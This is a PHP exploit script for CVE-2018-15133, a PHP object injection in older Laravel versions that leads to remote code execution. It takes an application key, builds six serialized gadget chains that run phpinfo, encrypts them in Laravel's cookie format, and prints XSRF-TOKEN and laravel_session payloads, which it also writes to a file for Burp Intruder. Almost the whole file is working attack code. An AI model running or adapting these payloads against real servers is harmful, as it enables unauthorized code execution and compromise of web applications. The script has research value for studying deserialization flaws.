<?php

class Encrypter
{
    public $key = "";
    public $ciphers = ['AES-256-CBC', 'AES-128-CBC'];

    public function __construct($key)
    {
        $key = (string) $key;
        if( explode(":", $key)[0] === 'base64' ) {
            $this->key = base64_decode(explode(':', $key)[1]);
        } else {
            $this->key = base64_decode($key);
        }
        
        echo "[*] Using key: ". $this->key . "\n";
    }

    public function encrypt($value)
    {
        $exploits = [];
        foreach ($this->ciphers as &$cipher) {
            $iv = random_bytes(openssl_cipher_iv_length($cipher));
            $value = \openssl_encrypt($value, $cipher, $this->key, 0, $iv);
            if ($value === false) {
                throw new EncryptException('Could not encrypt the data.');
            }
            $mac = $this->hash($iv = base64_encode($iv), $value);
            $json = json_encode(compact('iv', 'value', 'mac'));
            if (! is_string($json)) {
                throw new EncryptException('Could not encrypt the data.');
            }
            array_push($exploits, base64_encode($json));
        }
        return  $exploits;
        
    }

    protected function hash($iv, $value)
    {
        return hash_hmac('sha256', $iv.$value, $this->key);
    }

}


function usage($args) {
    $name = $args[0];
    echo "NAME: Laravel PHP Object Injection (CVE-2018-15133), leading to RCE.\n";
    echo "VERSIONS:\n";
    echo "  Version 5.5.4 and earlier.\n";
    echo "  Version 5.6.0 to 5.6.29.\n";
    echo "EXAMPLE: php $name \"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=\"";
    echo "AUTHOR: coiffeur\n\n";
}


if (count($argv) < 1 ) {
    usage($argv);
    exit;
}

$key = $argv[1];
$encrypter = new Encrypter($key);

$commamds  = ["phpinfo();", ["phpinfo", "1"]];
$output_file = fopen("burp_intruders_payloads.txt", "w") or die("Unable to open file!");

$j = 0;
$output_content = "";
$gadget_chains = [
    'a:2:{i:7;O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:15:"Faker\Generator":1:{s:13:"' . "\x00" . '*' . "\x00" . 'formatters";a:1:{s:8:"dispatch";s:' . strlen($commamds[1][0]) . ':"'. $commamds[1][0] .'";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($commamds[1][1]) . ':"'. $commamds[1][1] .'";}i:7;i:7;}',
    'a:2:{i:7;O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"' . "\x00" . '*' . "\x00" . 'listeners";a:1:{s:' . strlen($commamds[1][1]) . ':"'. $commamds[1][1] .'";a:1:{i:0;s:' . strlen($commamds[1][0]) . ':"'. $commamds[1][0] .'";}}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($commamds[1][1]) . ':"'. $commamds[1][1] .'";}i:7;i:7;}',
    'a:2:{i:7;O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"' . "\x00" . '*' . "\x00" . 'app";s:' . strlen($commamds[1][1]) . ':"'. $commamds[1][1] .'";s:17:"' . "\x00" . '*' . "\x00" . 'defaultChannel";s:1:"x";s:17:"' . "\x00" . '*' . "\x00" . 'customCreators";a:1:{s:1:"x";s:' . strlen($commamds[1][0]) . ':"'. $commamds[1][0] .'";}}}i:7;i:7;}',
    'a:2:{i:7;O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:' . strlen($commamds[1][0]) . ':"'. $commamds[1][0] .'";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($commamds[1][1]) . ':"'. $commamds[1][1] .'";}i:7;i:7;}',
    'a:2:{i:7;O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' . "\x00" . '*' . "\x00" . 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' . "\x00" . '*' . "\x00" . 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' . "\x00" . '*' . "\x00" . 'name";s:7:"abcdefg";}s:7:"' . "\x00" . '*' . "\x00" . 'code";s:' . strlen('<?php ' . $commamds[0] . ' exit; ?>') . ':"<?php ' . $commamds[0] . ' exit; ?>";}}}i:7;i:7;}',
    'a:2:{i:7;O:29:"Illuminate\Support\MessageBag":2:{s:11:"' . "\x00" . '*' . "\x00" . 'messages";a:0:{}s:9:"' . "\x00" . '*' . "\x00" . 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' . "\x00" . '*' . "\x00" . 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' . "\x00" . '*' . "\x00" . 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' . "\x00" . '*' . "\x00" . 'name";s:7:"abcdefg";}s:7:"' . "\x00" . '*' . "\x00" . 'code";s:' . strlen('<?php ' . $commamds[0] . ' exit; ?>') . ':"<?php ' . $commamds[0] . ' exit; ?>";}}}}i:7;i:7;}'
];
foreach ($gadget_chains as &$gadget_chain) {
    echo "[*] Gadget used:"."\n".$gadget_chain."\n";
    $exploits = $encrypter->encrypt($gadget_chain);
    echo "[*] Possible exploits:\n";
    
    foreach ($exploits as &$exploit) {
        echo "--[+] Exploit $j (cipher used: " . $encrypter->ciphers[$j % 2] ."):\nX-XSRF-TOKEN: $exploit\n\nXSRF-TOKEN: $exploit\n\n";
        $output_content =  $output_content . "X-XSRF-TOKEN: $exploit\nXSRF-TOKEN: $exploit\n";
        $exploit = urlencode($exploit);
        echo "Cookie: laravel_session=$exploit\n\n";
        $output_content =  $output_content . "Cookie: laravel_session=$exploit\n";
        $j ++;
    }
}

fwrite($output_file, $output_content);
fclose($output_file);
return 0;
?>